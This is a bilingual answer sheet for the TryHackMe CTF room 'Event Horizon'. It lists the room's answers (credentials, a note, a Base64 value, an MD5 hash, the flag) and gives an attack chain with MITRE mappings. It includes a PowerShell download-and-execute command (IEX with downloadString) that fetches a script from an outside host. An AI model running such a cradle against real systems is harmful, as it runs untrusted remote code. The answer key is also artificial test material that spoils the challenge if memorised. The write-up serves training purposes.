# Event Horizon

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Hard | CTF | eventhorizonroom | [Event Horizon](https://tryhackme.com/room/eventhorizonroom) | 03 Level Hard | TryHackMe | Credenciales, Mensaje, Comando, Base64, Hash, Flag | Alto |

---

**Contexto:**

> **ES:** Room CTF centrada en una máquina Windows donde se encadenan un correo con credenciales, una nota encontrada, un comando PowerShell de descarga, un valor Base64, un hash MD5 y la flag final del sistema.
> **EN:** CTF room focused on a Windows machine where an e-mail with credentials, a found note, a PowerShell download command, a Base64 value, an MD5 hash and the final system flag are chained together.

## Solucionario

### Task 1: Recorrido por la máquina / Machine walkthrough

**Explicación:**

El contenido original de la tarea es el siguiente:

1. 1. tom.dom@eventhorizon.thm:password
   2. Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm
   3. IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')
   4. l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=
   5. 13b1e64400203ecf38b1fdea2b11a09f
   6. FLAG{ABOVE_AND_B3YOND_THE_EVENT_HORIZON}

| Task | Pregunta / Question | Respuesta |
|---|---|---|
| 1 | ¿Cuáles son las credenciales encontradas? / What are the credentials found? | `tom.dom@eventhorizon.thm:password` |
| 1 | ¿Cuál es el mensaje dejado por Tom? / What message did Tom leave? | `Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm` |
| 1 | ¿Cuál es el comando PowerShell encontrado? / What is the PowerShell command found? | `IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')` |
| 1 | ¿Cuál es el valor Base64 encontrado? / What is the Base64 value found? | `l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=` |
| 1 | ¿Cuál es el hash MD5 encontrado? / What is the MD5 hash found? | `13b1e64400203ecf38b1fdea2b11a09f` |
| 1 | ¿Cuál es la flag final? / What is the final flag? | `FLAG{ABOVE_AND_B3YOND_THE_EVENT_HORIZON}` |

---

**Metodología:**

Recopilación de credenciales, análisis de correo y notas, identificación de comandos de descarga, decodificación Base64, obtención de hashes y escalada hasta la flag del sistema.

### Cadena de ataque / Attack Chain

1. Obtención de credenciales válidas para el dominio.
2. Lectura de la nota que revela la acción a ejecutar como AdministratOr.
3. Ejecución de la descarga del script `.ps1` remoto.
4. Decodificación del valor Base64 y obtención del hash MD5.
5. Recuperación de la flag final del sistema.

**Learning chain:**

`Event Horizon` → credenciales → nota → PowerShell downloader → Base64 → MD5 → flag del sistema.

**Lección:** *Una simple nota o script mal custodiado puede encadenarse con credenciales débiles para lograr ejecución remota: los artefactos aparentemente inocuos son piezas clave en la cadena de compromiso.*

**MITRE ATT&CK:** T1078 Valid Accounts, T1059.001 PowerShell, T1105 Ingress Tool Transfer, T1046 Network Service Discovery.

**Fuente:** [TryHackMe - Event Horizon](https://tryhackme.com/room/eventhorizonroom)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.